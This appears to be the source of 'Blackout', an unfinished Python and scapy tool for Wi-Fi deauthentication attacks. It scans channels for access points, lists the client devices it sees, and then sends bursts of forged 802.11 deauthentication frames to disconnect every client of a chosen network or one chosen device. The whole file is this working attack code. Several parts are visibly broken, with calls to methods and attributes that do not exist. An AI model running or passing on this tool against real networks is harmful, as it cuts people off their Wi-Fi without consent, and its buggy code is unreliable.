#!/usr/bin/python3

#  TODO: Use closure the fix the signal_handler issue
#  TODO: Use threads instead of Processes (threads were harder to stop with Ctrl-C?)
#  TODO: Improve -- Ending the AP sniffing phase. It's too rough. Ctrl-C is the current method.
#  TODO: Explore the use or curses library for the UI.
#  TODO: Can all the processes be daemonised?
#  TODO: Source most up-to-date vendor database. Find a way to keep it updated.
#  TODO: Use argparse for command-line options
#       TODO: Allow option for number of deauth packets to send (EX: -c 100)
#       TODO: Allow option for providing interface name

import os
import re
import sys
import signal
import curses
import pickle
import logging
import argparse
from time import sleep
from turtle import color
from utils import *
from subprocess import Popen
from threading import Thread
#from multiprocessing import Process, Manager
from scapy.all import *

# set scapy verbosity to zero
conf.verb = 0

# silence unwanted scapy output
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

BROADCAST_ADDR = "FF:FF:FF:FF:FF:FF"


class Blackout:

    def __init__(self, interface, stdscr, sniffer_window, control_window):

        # Set curses screen object
        self.stdscr = stdscr
        self.sniffer_window = sniffer_window
        self.control_window = control_window

        # Set scapy sniff interface
        conf.iface = interface

        # Compile list of vendors
        self.vendors = compile_vendors()

        self.ap_dict = dict()
        self.all_bssid = list()
        self.ap_clients = list()

        # Declare some necessary variables
        self.target_ap = None
        self.target_bssid = None
        self.target_client = None

        # Channel hopping thread
        self.thread_channel_hop = Thread(target=Blackout.channel_hop, args=(conf.iface,))
        # Make the thread run in the background as a daemon
        self.thread_channel_hop.daemon = True


        # AP sniffer Thread
        self.thread_sniff_ap = Thread(
            target=sniff, kwargs={
                'prn': self.sniff_access_points,
                'iface': conf.iface,
                'store': 0})


        # Client sniffer Thread
        self.thread_sniff_clients = Thread(
            target=sniff,
            kwargs={
                'prn': self.sniff_clients,
                'iface': conf.iface,
                'store': 0})

    def write_window(self, window, y, x, text, attr):
        #self.stdscr.noutrefresh()
        if x and y:
            window.addstr(y, x, text, attr)
        else:
            window.addstr(text)

        window.noutrefresh()
        curses.doupdate()

    def run(self):

        # clear screen
        self.stdscr.clear()

        try:
            start_mon(conf.iface, self.control_window)

            # Start daemon thread
            self.thread_channel_hop.start()
            self.write_window(self.sniffer_window, 1, 2, "[+] Sniffing for Access Points on all channels...", curses.A_BOLD)

            # Sniff for Wireless Access Points
            self.thread_sniff_ap.start()

            # Wait for processes to terminate
            self.thread_sniff_ap.join()

            # Output a very simple summary of findings
            horizontal_rule(30, self.control_window)
            self.write_windows(self.control_window, 1, 2, f"\nAccess Points discovered: {len(self.ap_dict)}\n\n")

            # Select an target AP
            self.target_ap = self.select_target_ap()
            
            # Important to make it upper for comparisons in self.sniff_clients
            self.target_bssid = self.target_ap['bssid'].upper()

            choice = choose_mode()

            # Deuth ALL clients from AP
            if choice == '1':
                Blackout.deauth(
                    self.target_ap['bssid'],
                    str(self.target_ap['channel']),
                    BROADCAST_ADDR)

            # Deauth specific client from AP
            elif choice == '2':
                horizontal_rule(30)
                self.window_write(self.control_windows, f"Sniffing for clients of AP - {self.target_ap['bssid']}...")
               # print(f"{Colour.OKBLUE}Press Ctrl-c to select target{Colour.ENDC}\n")

                self.proc_sniff_clients.start()
                self.proc_sniff_clients.join()

                self.list_clients()
                self.select_target_client()

                Blackout.deauth(
                    self.target_ap['bssid'],
                    str(self.target_ap['channel']),
                    self.target_client)

        except Exception as e:
            print(f"[!] Error: {e}")

        except KeyboardInterrupt:
            pass

        finally:
            # Put network card back into managed mode
            stop_mon(conf.iface)

            # record the detected AP's
            # with open("report.txt", "w") as f:
            #     for k, v in _ap_dict.items():
            #         f.write(f"{k} | {v[1]} | {v[2]}\n")

            # END

    @staticmethod
    def deauth(bssid, channel, target):
        """
        create deauth packets and send them to the target AP
        TODO:
        Allow multiple targets, including clients aswell as AP's
        """

        if target is BROADCAST_ADDR:
            print(f"\n[*] Deauthenticating ALL clients from {bssid} on channel {channel}...")
        else:
            print(f"[*] Deauthing {target} from {bssid} on channel {channel}...")

        try:
            go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
            go_to_chan.communicate()

            dot11 = Dot11(type=0, subtype=12, addr1=target, addr2=bssid, addr3=bssid)
            # create deauth packet for AP and add to list
            deauth_pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)

            # send it
            # I don't think you're really supposed to use a for loop for this,
            # instead use the count argument to set number of packets. However,
            # I found this to be more reliable.
            try:
                #while True:
                sendp(deauth_pkt, inter=0.1, count=100, iface=conf.iface)

            except KeyboardInterrupt:
                print("[*] Keyboard Interrupt\n")
            except Exception as e:
                print(f"[!] Error: {e}")
                stop_mon(conf.iface)
                sys.exit(0)

            print("[*] Deauthentication Complete")
            return

        except Exception as e:
            print(f"[!] Error while Deauthenticating: {e}")

    def select_target_client(self):
        horizontal_rule(30)

        target_id = int(input("\nEnter ID of the client you wish to target: "))

        #  FORMAT: _ap_dict[count] = [bssid, ssid, channel, [clients, .. , ]]
        # [{'1': [client info, ]}, {'2', [client info, ... ]}, ... ]
        self.target_client = self.ap_clients[target_id - 1]

        horizontal_rule(30)
        print(f"\nTargeting Client: [{self.target_client}]\n")
        horizontal_rule(30)

    def sniff_clients(self, pkt):

        # Go to correct channel
        channel = str(self.target_ap['channel'])
        go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
        go_to_chan.communicate()

        # IF right type of frame, and not involved in authentication
        try:
            if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type in (1, 2): # and not pkt.haslayer(EAPOL):
                # Packet is a Data or Control Frame
                if pkt.addr1 and pkt.addr2:

                    # Get destination and source MAC addresses
                    dst = pkt.addr1.upper()
                    src = pkt.addr2.upper()

                    # If the target AP is either source or destination, we know the other is a client
                    if BROADCAST_ADDR not in (dst, src):
                        if src == self.target_bssid and dst not in self.ap_clients:
                            self.ap_clients.append(dst)
                            print(f"[*] {dst}\t{self.get_vendor(dst)}")

                        elif dst == self.target_bssid and src not in self.ap_clients:
                            self.ap_clients.append(src)
                            print(f"[*] {src}\t{self.get_vendor(src)}")

        except Exception as e:
            print(f"[*] sniff_clients error: {e}")

    def list_clients(self):
        print("\n")
        horizontal_rule(20)
        for i, client in enumerate(self.ap_clients):
            # Find manufacturer
            name = self.get_vendor(client)
            print(f"{i + 1}) {client}\t{name}")

    def select_target_ap(self):
        horizontal_rule(30)

        target_id = int(input("\nEnter ID of the AP you wish to target: "))

        #  FORMAT: _ap_dict[count] = [bssid, ssid, channel, [clients, .. , ]]
        target_ap = self.ap_dict[target_id]

        horizontal_rule(30)
        print(f"\nSelected Access Point [{target_id}]\n")
        print(f"\tssid:\t\t{target_ap['ssid']:20}")
        print(f"\tbssid:\t\t{target_ap['bssid']:20}")
        print(f"\tchannel:\t\t{target_ap['channel']:20}\n")
        horizontal_rule(30)

        return target_ap

    def sniff_access_points(self, pkt):
        """
        Sniff packets, and extract info from them
        """
        # Here scapy is going to check whether each sniffed packet
        # has particular 'layers' of encapsulation
        # and act accordingly

        if pkt.haslayer(Dot11):
            # Check for beacon frames or probe responses from AP's
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                
                # If the packet contains a BSSID we have not encountered
                if pkt.addr3.upper() not in self.all_bssid:  # addr3 -> BSSID
                    self.sniffer_window.addstr("\nFound a packet!\n")
                    self.refresh()
                    bssid = pkt.addr3.upper()  # add the bssid to our bssid list
                    self.all_bssid.append(bssid)

                    try:
                        count = len(self.ap_dict) + 1  # No. of AP's collected
                        ssid = pkt[3].info.decode()  # Extract SSID
                        if not re.match(r'[\w\-\.]+', ssid):  # Check for valid SSID
                            ssid = "*HIDDEN/NONE*"  # SSID is hidden

                        # credit to airoscapy.py(by iphelix) for this
                        # It's decoding the channel info from an awkward hex formatting('/x03' etc.)

                        channel = ord(pkt[Dot11Elt:3].info)

                        # Add Access-Point to the 'cross-process' dict
                        self.ap_dict[count] = {'bssid': bssid, 'ssid': ssid, 'channel': channel}
                        vendor = self.get_vendor(bssid)

                        # Output the catch
                        #self.sniffer_window.addstr(f"%2d)\t{Colour.OKBLUE}%-20s\t{Colour.OKGREEN}%-20s\t{Colour.ENDC}%2d\t\t%-20s\n" % (
                        #    count, ssid, bssid, channel, vendor))
                        self.sniffer_window.erase()
                        self.sniffer_window.addstr(1, 1, f"{count})\t{ssid}\t{bssid}\t{channel}\t\t{vendor}\n", curses.A_BOLD)
                        self.refresh()

                    except Exception as e:
                        if "ord" in f"{e}":  # TODO This may be to do with 5GHz channels cropping up?
                            pass
                        else:
                            self.control_window.erase()
                            self.control_window.addstr(f"[!] Sniffer Error: {e}")
                            self.refresh()

    def get_vendor(self, bssid):
        name = ""
        try:
            name = self.vendors[bssid[:8]]
        except KeyError:
            name = "unknown device"

        return name

    @staticmethod
    def channel_hop(self):
        """
        Hop channels until interrupted
        """

        # total of 13 channels to search through
        limit = 14

        while True:
            for i in range(1, 14): 
                channel = i % limit
                #print(channel)

                # using Popen instead of os.system here avoids superfluous
                # output to the terminal from the iw command
                # which at times can crash the program (I'm not sure why yet)
                # Note: I don't seem to need to PIPE any outputs(stdout etc.) for this to work

                #print("{} - {}".format(conf.iface, type(conf.iface)))
                p = Popen(["iw", "dev", str(conf.iface), "set", "channel", str(channel)])
                try:
                    # effectively execute p
                    p.communicate()
                    sleep(1)  # TODO -- Experiment with different values
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"[!] {Colour.FAIL}Channel Hop Error: {e}{Colour.ENDC}")

    def signal_handler(self, sig, stack_frame):
        """
        This handles an interrupt signal, like
        Ctrl-C. Once detected, the program will sleep
        So we can 'get our affairs in order'(read 'print summary')
        """
        sleep(1)

        try:
            self.proc_channel_hop.terminate()
            self.proc_channel_hop.join()
        except Exception:
            pass

        try:
            self.proc_sniff_ap.terminate()
            self.proc_sniff_ap.join()
        except Exception:
            pass

        try:
            self.proc_sniff_clients.terminate()
            self.proc_sniff_clients.join()
        except Exception:
            pass
        finally:
            curses.nocbreak()
            stdscr.keypad(False)
            curses.echo()
            curses.endwin()


if __name__ == "__main__":

    # Setup curses
    stdscr = curses.initscr()
    curses.noecho()
    curses.cbreak()
    #curses.curs_set(0)
    stdscr.keypad(True)

    curses.start_color()

    curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_WHITE) #color pair 1
    highlightText = curses.color_pair(1) #color pair for highlighted menu option
    normalText = curses.A_NORMAL #color pair for non-highlighted menu options

    HEIGHT, WIDTH = stdscr.getmaxyx()

    sniffer_window = curses.newwin(int(HEIGHT/2)-1, WIDTH-2, 1, 1)
    sniffer_window.border('|', '|', '-', '-', '+', '+', '+', '+')
    
    control_window = curses.newwin(int(HEIGHT/2)-1, WIDTH-2, int(HEIGHT/2), 1)
    control_window.border('|', '|', '-', '-', '+', '+', '+', '+')

    sniffer_window.addstr(0, 2, "Sniffer Output", curses.A_NORMAL)
    control_window.addstr(0, 2, "Control", curses.A_NORMAL)
    
    stdscr.noutrefresh()
    sniffer_window.noutrefresh()
    control_window.noutrefresh()
    curses.doupdate()

    blackout = Blackout("wlan0", stdscr, sniffer_window, control_window)

    # Set the signal handler
    signal.signal(signal.SIGINT, blackout.signal_handler)

    try:
        blackout.run()

    except Exception as e:
        print(f"[!] Error running blackout.run(): {e}")

    except KeyboardInterrupt:
        pass

    finally:
        curses.nocbreak()
        stdscr.keypad(False)
        curses.echo()
        curses.endwin()


